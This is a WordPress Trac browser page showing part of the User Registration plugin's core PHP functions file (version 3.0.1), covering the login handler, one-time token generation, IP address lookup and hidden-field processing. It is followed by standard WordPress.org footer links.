| [3509](#L3509) |  |
| [3510](#L3510) | $validation\_errorÂ =Â newÂ WP\_Error(); |
| [3511](#L3511) | $validation\_errorÂ =Â apply\_filters(Â 'user\_registration\_process\_login\_errors',Â $validation\_error,Â sanitize\_user(Â wp\_unslash(Â $post['username']Â )Â ),Â sanitize\_user(Â wp\_unslash(Â $post['password']Â )Â )Â ); |
| [3512](#L3512) |  |
| [3513](#L3513) | ifÂ (Â $validation\_error->get\_error\_code()Â )Â { |
| [3514](#L3514) | throwÂ newÂ Exception(Â '<strong>'Â .Â esc\_html\_\_(Â 'ERROR:',Â 'user-registration'Â )Â .Â '</strong>'Â .Â $validation\_error->get\_error\_message()Â ); |
| [3515](#L3515) | } |
| [3516](#L3516) |  |
| [3517](#L3517) | ifÂ (Â empty(Â $usernameÂ )Â )Â { |
| [3518](#L3518) | throwÂ newÂ Exception(Â '<strong>'Â .Â esc\_html\_\_(Â 'ERROR:',Â 'user-registration'Â )Â .Â '</strong>'Â .Â $messages['empty\_username']Â ); |
| [3519](#L3519) | } |
| [3520](#L3520) |  |
| [3521](#L3521) | ifÂ (Â is\_email(Â $usernameÂ )Â &&Â apply\_filters(Â 'user\_registration\_get\_username\_from\_email',Â trueÂ )Â )Â { |
| [3522](#L3522) | $userÂ =Â get\_user\_by(Â 'email',Â $usernameÂ ); |
| [3523](#L3523) |  |
| [3524](#L3524) | ifÂ (Â isset(Â $user->user\_loginÂ )Â )Â { |
| [3525](#L3525) | $login\_data['user\_login']Â =Â $user->user\_login; |
| [3526](#L3526) | }Â elseÂ { |
| [3527](#L3527) | ifÂ (Â empty(Â $messages['unknown\_email']Â )Â )Â { |
| [3528](#L3528) | $messages['unknown\_email']Â =Â esc\_html\_\_(Â 'A user could not be found with this email address.',Â 'user-registration'Â ); |
| [3529](#L3529) | } |
| [3530](#L3530) |  |
| [3531](#L3531) | throwÂ newÂ Exception(Â '<strong>'Â .Â esc\_html\_\_(Â 'ERROR: ',Â 'user-registration'Â )Â .Â '</strong>'Â .Â $messages['unknown\_email']Â ); |
| [3532](#L3532) | } |
| [3533](#L3533) | }Â elseÂ { |
| [3534](#L3534) | $login\_data['user\_login']Â =Â $username; |
| [3535](#L3535) | } |
| [3536](#L3536) |  |
| [3537](#L3537) | // On multisite, ensure user exists on current site, if not add them before allowing login. |
| [3538](#L3538) | ifÂ (Â is\_multisite()Â )Â { |
| [3539](#L3539) | $user\_dataÂ =Â get\_user\_by(Â 'login',Â $usernameÂ ); |
| [3540](#L3540) |  |
| [3541](#L3541) | ifÂ (Â $user\_dataÂ &&Â !Â is\_user\_member\_of\_blog(Â $user\_data->ID,Â get\_current\_blog\_id()Â )Â )Â { |
| [3542](#L3542) | add\_user\_to\_blog(Â get\_current\_blog\_id(),Â $user\_data->ID,Â 'customer'Â ); |
| [3543](#L3543) | } |
| [3544](#L3544) | } |
| [3545](#L3545) |  |
| [3546](#L3546) | // To check the specific login. |
| [3547](#L3547) | ifÂ (Â 'email'Â ===Â get\_option(Â 'user\_registration\_general\_setting\_login\_options\_with',Â array()Â )Â )Â { |
| [3548](#L3548) | $user\_dataÂ  Â  Â  Â  Â  Â  Â  Â  =Â get\_user\_by(Â 'email',Â $usernameÂ ); |
| [3549](#L3549) | $login\_data['user\_login']Â =Â isset(Â $user\_data->user\_emailÂ )Â ?Â $user\_data->user\_emailÂ :Â is\_email(Â $usernameÂ ); |
| [3550](#L3550) | }Â elseifÂ (Â 'username'Â ===Â get\_option(Â 'user\_registration\_general\_setting\_login\_options\_with',Â array()Â )Â )Â { |
| [3551](#L3551) | $user\_dataÂ  Â  Â  Â  Â  Â  Â  Â  =Â get\_user\_by(Â 'login',Â $usernameÂ ); |
| [3552](#L3552) | $login\_data['user\_login']Â =Â isset(Â $user\_data->user\_loginÂ )Â ?Â $user\_data->user\_loginÂ :Â !Â is\_email(Â $usernameÂ ); |
| [3553](#L3553) | }Â elseÂ { |
| [3554](#L3554) | $login\_data['user\_login']Â =Â $username; |
| [3555](#L3555) | } |
| [3556](#L3556) |  |
| [3557](#L3557) | // Perform the login. |
| [3558](#L3558) | $userÂ =Â wp\_signon(Â apply\_filters(Â 'user\_registration\_login\_credentials',Â $login\_dataÂ ),Â is\_ssl()Â ); |
| [3559](#L3559) |  |
| [3560](#L3560) | ifÂ (Â is\_wp\_error(Â $userÂ )Â )Â { |
| [3561](#L3561) | // Set custom error messages. |
| [3562](#L3562) | ifÂ (Â !Â empty(Â $user->errors['empty\_username']Â )Â &&Â !Â empty(Â $messages['empty\_username']Â )Â )Â { |
| [3563](#L3563) | $user->errors['empty\_username'][0]Â =Â sprintf(Â '<strong>%s:</strong> %s',Â \_\_(Â 'ERROR',Â 'user-registration'Â ),Â $messages['empty\_username']Â ); |
| [3564](#L3564) | } |
| [3565](#L3565) | ifÂ (Â !Â empty(Â $user->errors['empty\_password']Â )Â &&Â !Â empty(Â $messages['empty\_password']Â )Â )Â { |
| [3566](#L3566) | $user->errors['empty\_password'][0]Â =Â sprintf(Â '<strong>%s:</strong> %s',Â \_\_(Â 'ERROR',Â 'user-registration'Â ),Â $messages['empty\_password']Â ); |
| [3567](#L3567) | } |
| [3568](#L3568) | ifÂ (Â !Â empty(Â $user->errors['invalid\_username']Â )Â &&Â !Â empty(Â $messages['invalid\_username']Â )Â )Â { |
| [3569](#L3569) | $user->errors['invalid\_username'][0]Â =Â $messages['invalid\_username']; |
| [3570](#L3570) | } |
| [3571](#L3571) | ifÂ (Â !Â empty(Â $user->errors['pending\_approval']Â )Â &&Â !Â empty(Â $messages['pending\_approval']Â )Â )Â { |
| [3572](#L3572) | $user->errors['pending\_approval'][0]Â =Â sprintf(Â '<strong>%s:</strong> %s',Â \_\_(Â 'ERROR',Â 'user-registration'Â ),Â $messages['pending\_approval']Â ); |
| [3573](#L3573) | } |
| [3574](#L3574) | ifÂ (Â !Â empty(Â $user->errors['denied\_access']Â )Â &&Â !Â empty(Â $messages['denied\_access']Â )Â )Â { |
| [3575](#L3575) | $user->errors['denied\_access'][0]Â =Â sprintf(Â '<strong>%s:</strong> %s',Â \_\_(Â 'ERROR',Â 'user-registration'Â ),Â $messages['denied\_access']Â ); |
| [3576](#L3576) | } |
| [3577](#L3577) |  |
| [3578](#L3578) | $messageÂ =Â $user->get\_error\_message(); |
| [3579](#L3579) | $messageÂ =Â str\_replace(Â '<strong>'Â .Â esc\_html(Â $login\_data['user\_login']Â )Â .Â '</strong>',Â '<strong>'Â .Â esc\_html(Â $usernameÂ )Â .Â '</strong>',Â $messageÂ ); |
| [3580](#L3580) | throwÂ newÂ Exception(Â $messageÂ ); |
| [3581](#L3581) | }Â elseÂ { |
| [3582](#L3582) | ifÂ (Â in\_array(Â 'administrator',Â $user->roles,Â trueÂ )Â &&Â ur\_option\_checked(Â 'user\_registration\_login\_options\_prevent\_core\_login',Â trueÂ )Â )Â { |
| [3583](#L3583) | $redirectÂ =Â admin\_url(); |
| [3584](#L3584) | }Â elseÂ { |
| [3585](#L3585) | ifÂ (Â !Â empty(Â $post['redirect']Â )Â )Â { |
| [3586](#L3586) | $redirectÂ =Â esc\_url\_raw(Â wp\_unslash(Â $post['redirect']Â )Â ); |
| [3587](#L3587) | }Â elseifÂ (Â wp\_get\_raw\_referer()Â )Â { |
| [3588](#L3588) | $redirectÂ =Â wp\_get\_raw\_referer(); |
| [3589](#L3589) | }Â elseÂ { |
| [3590](#L3590) | $redirectÂ =Â get\_home\_url(); |
| [3591](#L3591) | } |
| [3592](#L3592) | } |
| [3593](#L3593) |  |
| [3594](#L3594) | $redirectÂ =Â apply\_filters(Â 'user\_registration\_login\_redirect',Â $redirect,Â $userÂ ); |
| [3595](#L3595) |  |
| [3596](#L3596) | ifÂ (Â ur\_is\_ajax\_login\_enabled()Â )Â { |
| [3597](#L3597) | wp\_send\_json\_success(Â array(Â 'message'Â =>Â $redirectÂ )Â ); |
| [3598](#L3598) | wp\_send\_json(Â $userÂ ); |
| [3599](#L3599) | }Â elseÂ { |
| [3600](#L3600) | wp\_redirect(Â wp\_validate\_redirect(Â $redirect,Â $redirectÂ )Â ); |
| [3601](#L3601) | exit; |
| [3602](#L3602) | } |
| [3603](#L3603) |  |
| [3604](#L3604) | ifÂ (Â ur\_is\_ajax\_login\_enabled()Â )Â { |
| [3605](#L3605) | wp\_send\_json(Â $userÂ ); |
| [3606](#L3606) | } |
| [3607](#L3607) | } |
| [3608](#L3608) | }Â catchÂ (Â ExceptionÂ $eÂ )Â { |
| [3609](#L3609) | $status\_codeÂ =Â $e->getCode(); |
| [3610](#L3610) | $messageÂ  Â  Â =Â $e->getMessage(); |
| [3611](#L3611) |  |
| [3612](#L3612) | ifÂ (Â $status\_codeÂ >=Â 200Â &&Â $status\_codeÂ <Â 300Â )Â { |
| [3613](#L3613) | ifÂ (Â ur\_is\_ajax\_login\_enabled()Â )Â { |
| [3614](#L3614) | wp\_send\_json\_success( |
| [3615](#L3615) | array( |
| [3616](#L3616) | 'message'Â =>Â $message, |
| [3617](#L3617) | 'status'Â  =>Â true, |
| [3618](#L3618) | ) |
| [3619](#L3619) | ); |
| [3620](#L3620) | } |
| [3621](#L3621) |  |
| [3622](#L3622) | ur\_add\_notice(Â $message,Â 'success'Â ); |
| [3623](#L3623) | }Â elseÂ { |
| [3624](#L3624) |  |
| [3625](#L3625) | ifÂ (Â ur\_is\_ajax\_login\_enabled()Â )Â { |
| [3626](#L3626) | wp\_send\_json\_error( |
| [3627](#L3627) | array( |
| [3628](#L3628) | 'message'Â =>Â $message, |
| [3629](#L3629) | ) |
| [3630](#L3630) | ); |
| [3631](#L3631) | } |
| [3632](#L3632) |  |
| [3633](#L3633) | ur\_add\_notice(Â apply\_filters(Â 'login\_errors',Â $messageÂ ),Â 'error'Â ); |
| [3634](#L3634) | do\_action(Â 'user\_registration\_login\_failed'Â ); |
| [3635](#L3635) | } |
| [3636](#L3636) | } |
| [3637](#L3637) | } |
| [3638](#L3638) | } |
| [3639](#L3639) |  |
| [3640](#L3640) | ifÂ (Â !Â function\_exists(Â 'ur\_generate\_onetime\_token'Â )Â )Â { |
| [3641](#L3641) | /\*\* |
| [3642](#L3642) | \* Generate a one-time token for the given user ID and action. |
| [3643](#L3643) | \* |
| [3644](#L3644) | \* @param intÂ  Â  $user\_id The ID of the user for whom to generate the token. |
| [3645](#L3645) | \* @param string $action The action for which to generate the token. |
| [3646](#L3646) | \* @param intÂ  Â  $key\_length The length of the random key to be generated. Defaults to 32. |
| [3647](#L3647) | \* @param intÂ  Â  $expiration\_time The duration of the token's validity in minutes. Defaults to 60. |
| [3648](#L3648) | \* @return string The generated one-time token. |
| [3649](#L3649) | \*/ |
| [3650](#L3650) | functionÂ ur\_generate\_onetime\_token(Â $user\_idÂ =Â 0,Â $actionÂ =Â '',Â $key\_lengthÂ =Â 32,Â $expiration\_timeÂ =Â 60Â )Â { |
| [3651](#L3651) | $timeÂ =Â time(); |
| [3652](#L3652) | $keyÂ  =Â wp\_generate\_password(Â $key\_length,Â falseÂ ); |
| [3653](#L3653) |  |
| [3654](#L3654) | // Concatenate the key, action, and current time to form the token string. |
| [3655](#L3655) | $stringÂ =Â $keyÂ .Â $actionÂ .Â $time; |
| [3656](#L3656) |  |
| [3657](#L3657) | // Generate the token hash. |
| [3658](#L3658) | $tokenÂ =Â wp\_hash(Â $stringÂ ); |
| [3659](#L3659) |  |
| [3660](#L3660) | // Set the token expiration time in seconds. |
| [3661](#L3661) | $expirationÂ =Â apply\_filters(Â $actionÂ .Â '\_onetime\_token\_expiration',Â $expiration\_timeÂ \*Â 60Â ); |
| [3662](#L3662) |  |
| [3663](#L3663) | // Set the user meta values for the token and expiration time. |
| [3664](#L3664) | update\_user\_meta(Â $user\_id,Â $actionÂ .Â '\_token'Â .Â $user\_id,Â $tokenÂ ); |
| [3665](#L3665) | update\_user\_meta(Â $user\_id,Â $actionÂ .Â '\_token\_expiration'Â .Â $user\_id,Â $timeÂ +Â $expirationÂ ); |
| [3666](#L3666) |  |
| [3667](#L3667) | returnÂ $token; |
| [3668](#L3668) | } |
| [3669](#L3669) | } |
| [3670](#L3670) |  |
| [3671](#L3671) | ifÂ (Â !Â function\_exists(Â 'ur\_get\_current\_page\_url'Â )Â )Â { |
| [3672](#L3672) | /\*\* |
| [3673](#L3673) | \* Get the current page URL. |
| [3674](#L3674) | \* |
| [3675](#L3675) | \* @return string The URL of the current page. |
| [3676](#L3676) | \*/ |
| [3677](#L3677) | functionÂ ur\_get\_current\_page\_url()Â { |
| [3678](#L3678) | $page\_urlÂ =Â ''; |
| [3679](#L3679) |  |
| [3680](#L3680) | ifÂ (Â isset(Â $\_SERVER['HTTPS']Â )Â &&Â 'on'Â ===Â $\_SERVER['HTTPS']Â )Â { |
| [3681](#L3681) | $page\_urlÂ .=Â 'https://'; |
| [3682](#L3682) | }Â elseÂ { |
| [3683](#L3683) | $page\_urlÂ .=Â 'http://'; |
| [3684](#L3684) | } |
| [3685](#L3685) |  |
| [3686](#L3686) | ifÂ (Â isset(Â $\_SERVER['HTTP\_HOST']Â )Â )Â { |
| [3687](#L3687) | $page\_urlÂ .=Â sanitize\_text\_field(Â wp\_unslash(Â $\_SERVER['HTTP\_HOST']Â )Â ); |
| [3688](#L3688) | } |
| [3689](#L3689) |  |
| [3690](#L3690) | ifÂ (Â isset(Â $\_SERVER['REQUEST\_URI']Â )Â )Â { |
| [3691](#L3691) | $page\_urlÂ .=Â sanitize\_text\_field(Â wp\_unslash(Â $\_SERVER['REQUEST\_URI']Â )Â ); |
| [3692](#L3692) | } |
| [3693](#L3693) |  |
| [3694](#L3694) | returnÂ $page\_url; |
| [3695](#L3695) | } |
| [3696](#L3696) | } |
| [3697](#L3697) |  |
| [3698](#L3698) | ifÂ (Â !Â function\_exists(Â 'ur\_is\_passwordless\_login\_enabled'Â )Â )Â { |
| [3699](#L3699) | /\*\* |
| [3700](#L3700) | \* Check whether the passwordless login is enabled or not. |
| [3701](#L3701) | \* |
| [3702](#L3702) | \* @return bool |
| [3703](#L3703) | \*/ |
| [3704](#L3704) | functionÂ ur\_is\_passwordless\_login\_enabled()Â { |
| [3705](#L3705) | returnÂ ur\_option\_checked(Â 'user\_registration\_pro\_passwordless\_login',Â falseÂ ); |
| [3706](#L3706) | } |
| [3707](#L3707) | } |
| [3708](#L3708) |  |
| [3709](#L3709) | ifÂ (Â !Â function\_exists(Â 'ur\_get\_ip\_address'Â )Â )Â { |
| [3710](#L3710) |  |
| [3711](#L3711) | /\*\* |
| [3712](#L3712) | \* Get current user IP Address. |
| [3713](#L3713) | \* |
| [3714](#L3714) | \* @return string |
| [3715](#L3715) | \*/ |
| [3716](#L3716) | functionÂ ur\_get\_ip\_address()Â { |
| [3717](#L3717) | ifÂ (Â isset(Â $\_SERVER['HTTP\_X\_REAL\_IP']Â )Â )Â {Â // WPCS: input var ok, CSRF ok. |
| [3718](#L3718) | returnÂ sanitize\_text\_field(Â wp\_unslash(Â $\_SERVER['HTTP\_X\_REAL\_IP']Â )Â );Â  // WPCS: input var ok, CSRF ok. |
| [3719](#L3719) | }Â elseifÂ (Â isset(Â $\_SERVER['HTTP\_X\_FORWARDED\_FOR']Â )Â )Â {Â // WPCS: input var ok, CSRF ok. |
| [3720](#L3720) | // Proxy servers can send through this header like this: X-Forwarded-For: client1, proxy1, proxy2 |
| [3721](#L3721) | // Make sure we always only send through the first IP in the list which should always be the client IP. |
| [3722](#L3722) | returnÂ (string)Â rest\_is\_ip\_address(Â trim(Â current(Â preg\_split(Â '/[,:]/',Â sanitize\_text\_field(Â wp\_unslash(Â $\_SERVER['HTTP\_X\_FORWARDED\_FOR']Â )Â )Â )Â )Â )Â );Â // WPCS: input var ok, CSRF ok. |
| [3723](#L3723) | }Â elseifÂ (Â isset(Â $\_SERVER['REMOTE\_ADDR']Â )Â )Â {Â // @codingStandardsIgnoreLine |
| [3724](#L3724) | returnÂ sanitize\_text\_field(Â wp\_unslash(Â $\_SERVER['REMOTE\_ADDR']Â )Â );Â // @codingStandardsIgnoreLine |
| [3725](#L3725) | } |
| [3726](#L3726) | returnÂ ''; |
| [3727](#L3727) | } |
| [3728](#L3728) | } |
| [3729](#L3729) |  |
| [3730](#L3730) | ifÂ (Â !Â function\_exists(Â 'ur\_get\_all\_pages'Â )Â )Â { |
| [3731](#L3731) | /\*\* |
| [3732](#L3732) | \* Returns map of published pages as id->title format. |
| [3733](#L3733) | \* |
| [3734](#L3734) | \* @return array |
| [3735](#L3735) | \*/ |
| [3736](#L3736) | functionÂ ur\_get\_all\_pages()Â { |
| [3737](#L3737) | $pagesÂ =Â get\_pages(); |
| [3738](#L3738) |  |
| [3739](#L3739) | $pages\_arrayÂ =Â array(); |
| [3740](#L3740) |  |
| [3741](#L3741) | foreachÂ (Â $pagesÂ asÂ $pageÂ )Â { |
| [3742](#L3742) | $pages\_array[Â $page->IDÂ ]Â =Â $page->post\_title; |
| [3743](#L3743) | } |
| [3744](#L3744) |  |
| [3745](#L3745) | returnÂ $pages\_array; |
| [3746](#L3746) | } |
| [3747](#L3747) | } |
| [3748](#L3748) |  |
| [3749](#L3749) | add\_action(Â 'user\_registration\_after\_user\_meta\_update',Â 'ur\_parse\_and\_update\_hidden\_field',Â 10,Â 3Â ); |
| [3750](#L3750) |  |
| [3751](#L3751) | ifÂ (Â !Â function\_exists(Â 'ur\_parse\_and\_update\_hidden\_field'Â )Â )Â { |
| [3752](#L3752) | /\*\* |
| [3753](#L3753) | \* Parse the hidden field value and update. |
| [3754](#L3754) | \* |
| [3755](#L3755) | \* @param array $form\_data form data. |
| [3756](#L3756) | \* @param intÂ  Â $form\_id form id. |
| [3757](#L3757) | \* @param intÂ  Â $user\_id user id. |
| [3758](#L3758) | \*/ |
| [3759](#L3759) | functionÂ ur\_parse\_and\_update\_hidden\_field(Â $form\_data,Â $form\_id,Â $user\_idÂ )Â { |
| [3760](#L3760) | $valuesÂ =Â array( |
| [3761](#L3761) | 'form\_id'Â  Â  Â  =>Â $form\_id, |
| [3762](#L3762) | 'process\_type'Â =>Â 'ur\_parse\_after\_meta\_update', |
| [3763](#L3763) | ); |
| [3764](#L3764) |  |
| [3765](#L3765) | foreachÂ (Â $form\_dataÂ asÂ $keyÂ =>Â $valueÂ )Â { |
| [3766](#L3766) | ifÂ (Â 'user\_email'Â ===Â $value->field\_nameÂ )Â { |
| [3767](#L3767) | $values['email']Â =Â ur\_format\_field\_values(Â $value->field\_name,Â $value->valueÂ ); |
| [3768](#L3768) | } |
| [3769](#L3769) |  |
| [3770](#L3770) | $values[Â $value->field\_nameÂ ]Â =Â ur\_format\_field\_values(Â $value->field\_name,Â $value->valueÂ ); |
| [3771](#L3771) | } |
| [3772](#L3772) |  |
| [3773](#L3773) | foreachÂ (Â $form\_dataÂ asÂ $keyÂ =>Â $valueÂ )Â { |
| [3774](#L3774) | ifÂ (Â isset(Â $value->extra\_params['field\_key']Â )Â &&Â 'hidden'Â ===Â $value->extra\_params['field\_key']Â )Â { |
| [3775](#L3775) | $contentÂ  Â  =Â $value->value; |
| [3776](#L3776) | $field\_nameÂ =Â 'user\_registration\_'Â .Â $value->field\_name; |
| [3777](#L3777) | ifÂ (Â ''Â !==Â $contentÂ )Â { |
| [3778](#L3778) | $contentÂ =Â apply\_filters(Â 'user\_registration\_process\_smart\_tags',Â $content,Â $valuesÂ ); |
| [3779](#L3779) | update\_user\_meta(Â $user\_id,Â $field\_name,Â $contentÂ ); |
| [3780](#L3780) | } |
| [3781](#L3781) | } |
| [3782](#L3782) | } |
| [3783](#L3783) | } |
| [3784](#L3784) | } |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/user-registration/tags/3.0.1/includes/functions-ur-core.php?format=txt)
* [Original Format](/export/3220636/user-registration/tags/3.0.1/includes/functions-ur-core.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


